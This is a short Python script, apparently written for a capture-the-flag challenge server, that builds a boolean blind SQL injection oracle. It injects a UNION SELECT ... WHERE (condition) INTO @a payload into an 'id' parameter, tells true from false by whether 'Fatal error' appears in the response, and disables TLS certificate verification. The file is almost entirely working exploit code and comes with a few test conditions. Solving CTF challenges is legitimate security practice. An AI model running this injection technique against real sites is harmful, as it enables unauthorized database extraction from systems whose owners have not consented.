import requests
import urllib3

urllib3.disable_warnings()

s = requests.Session()
s.verify = False
url = "https://04a2b0dcb17c2e99.chal.ctf.ae/"

def test_oracle(cond):
    p = f"1 UNION SELECT 2 WHERE ({cond}) INTO @a"
    r = s.get(url, params={"id": p})
    # If cond is TRUE -> 2 rows -> query fails -> die() -> "Fatal error" NOT in text
    # If cond is FALSE -> 1 row -> query returns true -> fetch_row() on bool -> "Fatal error" IS in text
    is_true = "Fatal error" not in r.text
    return is_true

print("Testing 1=1 (expected True):", test_oracle("1=1"))
print("Testing 1=2 (expected False):", test_oracle("1=2"))
print("Testing (SELECT 1)=1 (expected True):", test_oracle("(SELECT 1)=1"))
print("Testing (SELECT 1)=2 (expected False):", test_oracle("(SELECT 1)=2"))
